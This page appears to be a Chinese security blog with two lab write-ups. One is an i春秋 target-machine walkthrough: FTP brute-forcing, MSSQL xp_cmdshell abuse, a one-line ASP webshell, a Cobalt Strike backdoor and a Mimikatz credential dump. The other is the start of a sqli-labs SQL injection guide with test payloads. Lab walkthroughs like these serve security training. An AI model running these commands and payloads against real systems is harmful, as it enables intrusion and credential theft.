绕过火绒靶机获取管理员账号密码

2020-01-10
靶机 / i春秋

实验环境：

  1. Windows、火绒
  2. 网站 http://192.168.5.157/login/ （由于目标主机）
  3. 实验工具：nmap、hydra、Xftp6、DBeaver、cobaltstrike3.14

实验步骤：

1. 首先使用nmap工具对IP（192.168.5.157）进行扫描。

2. 利用hydra工具对ftp等服务进行爆破，发现ftp可以匿名登录。

3. 使用Xftp6工具以ftp方式连接，发现 global.asa 文件下存在mssql账号密码。


4. 下载文件，在本地以文本方式查看文件。

5. 利用DBeaver工具连接目标主机的mssql。

6. 通过 exec xp_cmdshell ‘dir C:' 命令获得网站路径，上传shell。

7. 通过 exec xp_cmdshell ‘echo ^<%eval^ request(“a”)%^> > C:\www\909.asp’ 命令添加一句话木马的asp文件。

8. 利用cobaltstrike3.14工具生成 909.exe 后门文件，使用中国菜刀将后门文件上传到目标主机上。

9. 在DBeaver工具上执行 EXEC xp_cmdshell ‘c:\www\909.exe’ 命令，使后门软件开始执行。在cobaltstrike3.14工具的客户端上出现目标主机IP。

10. 在cobaltstrike3.14工具的客户端上将设备的sleep时间改为 1 ，再点击 Run Mimikatz 按钮获取账号密码。

Sqli-labs通关攻略

2019-12-19
攻略 / 通关小游戏

第一关

如何传参：

/sqli-labs/Less-1/?id=1

根据SQL注入思路：
第一步判断存不存在注入点：

/sqli-labs/Less-1/?id=1' and 1=1 --+  //显示正常
/sqli-labs/Less-1/?id=1' and 1=2 --+ //无显示

存在注入点，则执行第二步，使用order by查找多少列：

/sqli-labs/Less-1/?id=1' order by 3 --+ //显示正常
/sqli-labs/Less-1/?id=1' order by 4 --+ //显示Unknown column '4' in 'order clause'
